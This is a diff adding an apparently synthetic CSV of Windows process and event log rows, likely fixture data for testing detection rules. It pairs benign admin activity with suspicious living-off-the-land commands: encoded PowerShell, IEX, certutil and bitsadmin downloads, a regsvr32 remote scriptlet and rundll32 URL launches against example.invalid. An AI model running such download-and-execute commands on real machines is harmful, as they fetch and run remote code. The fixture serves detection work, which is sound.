@@ -1,0 +1,23 @@
+timestamp,computer,user,command_line,ParentImage,EventID,ImagePath,Destination,ScriptBlockText
+2026-11-11T09:00:00Z,DEMO-01,analyst,powershell.exe -NoProfile -EncodedCommand <TEST_PAYLOAD>,C:\Windows\explorer.exe,1,,,
+2026-11-11T09:01:00Z,DEMO-01,admin,powershell.exe -NoProfile -File C:\Program Files\IT\Inventory.ps1,C:\Windows\System32\services.exe,1,,,
+2026-11-11T09:02:00Z,DEMO-02,analyst,"powershell.exe -Command ""IEX $payload""",C:\Windows\explorer.exe,1,,,
+2026-11-11T09:03:00Z,DEMO-02,admin,powershell.exe Get-Date,C:\Windows\explorer.exe,1,,,
+2026-11-11T09:04:00Z,DEMO-03,analyst,cmd.exe /c whoami,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,1,,,
+2026-11-11T09:05:00Z,DEMO-03,admin,cmd.exe /c setup-check,C:\Windows\System32\msiexec.exe,1,,,
+2026-11-11T09:06:00Z,DEMO-04,analyst,certutil.exe -urlcache -split -f https://example.invalid/sample.bin C:\Users\Public\sample.bin,C:\Windows\System32\cmd.exe,1,,,
+2026-11-11T09:07:00Z,DEMO-04,admin,certutil.exe -verify C:\ProgramData\PKI\issued.cer,C:\Windows\System32\mmc.exe,1,,,
+2026-11-11T09:08:00Z,DEMO-05,analyst,bitsadmin.exe /transfer job1 https://example.invalid/package.bin C:\Users\Public\package.bin,C:\Windows\System32\cmd.exe,1,,,
+2026-11-11T09:09:00Z,DEMO-05,admin,bitsadmin.exe /list /allusers,C:\Windows\explorer.exe,1,,,
+2026-11-11T09:10:00Z,DEMO-06,analyst,mshta.exe javascript:/* inert test marker */,C:\Windows\explorer.exe,1,,,
+2026-11-11T09:11:00Z,DEMO-06,admin,mshta.exe C:\Program Files\Contoso\Help.hta,C:\Windows\explorer.exe,1,,,
+2026-11-11T09:12:00Z,DEMO-07,analyst,regsvr32.exe /s /n /u /i:https://example.invalid/sample.sct scrobj.dll,C:\Windows\System32\cmd.exe,1,,,
+2026-11-11T09:13:00Z,DEMO-07,admin,regsvr32.exe /s C:\Program Files\Contoso\component.dll,C:\Windows\System32\msiexec.exe,1,,,
+2026-11-11T09:14:00Z,DEMO-08,analyst,"rundll32.exe url.dll,FileProtocolHandler https://example.invalid/resource",C:\Windows\System32\cmd.exe,1,,,
+2026-11-11T09:15:00Z,DEMO-08,admin,"rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl",C:\Windows\explorer.exe,1,,,
+2026-11-11T09:16:00Z,DEMO-09,analyst,,C:\Windows\explorer.exe,4104,,,"[Convert]::FromBase64String('TEST')"
+2026-11-11T09:17:00Z,DEMO-09,admin,,C:\Windows\explorer.exe,4104,,,Get-Process
+2026-11-11T09:18:00Z,DEMO-10,analyst,,C:\Windows\services.exe,7045,C:\Users\Public\demo-service.exe,,
+2026-11-11T09:19:00Z,DEMO-10,admin,,C:\Windows\services.exe,7045,C:\Program Files\Contoso\Agent\agent.exe,,
+2026-11-11T09:20:00Z,DEMO-11,analyst,,C:\Windows\System32\wbem\WmiPrvSE.exe,20,,C:\ProgramData\helper.ps1,
+2026-11-11T09:21:00Z,DEMO-11,admin,,C:\Windows\System32\wbem\WmiPrvSE.exe,20,,C:\Program Files\Contoso\Monitor.exe,
